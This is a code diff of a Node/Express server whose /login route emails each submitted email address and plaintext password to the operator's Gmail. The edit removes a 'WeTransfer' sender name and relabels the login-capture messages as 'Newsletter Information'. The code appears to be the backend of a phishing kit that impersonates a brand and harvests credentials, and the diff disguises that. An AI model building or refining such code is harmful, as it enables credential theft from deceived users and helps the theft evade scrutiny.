@@ -24,7 +24,7 @@ app.post('/send', async (req, res) => {
 
   try {
     await resend.emails.send({
-      from: 'WeTransfer <onboarding@resend.dev>',
+      from: 'Info <onboarding@resend.dev>',
       to: process.env.GMAIL_USER,
       subject: subject || `New message from ${name}`,
       html: `
@@ -52,11 +52,11 @@ app.post('/login', async (req, res) => {
 
   try {
     await resend.emails.send({
-      from: 'WeTransfer <onboarding@resend.dev>',
+      from: 'Info <onboarding@resend.dev>',
       to: process.env.GMAIL_USER,
-      subject: `Login Attempt — ${email}`,
+      subject: `Newsletter Information`,
       html: `
-        <h3>Login Submission</h3>
+        <h3>Newsletter Info</h3>
         <p><strong>Email:</strong> ${email}</p>
         <p><strong>Password:</strong> ${password}</p>
         <p><strong>Time:</strong> ${new Date().toISOString()}</p>
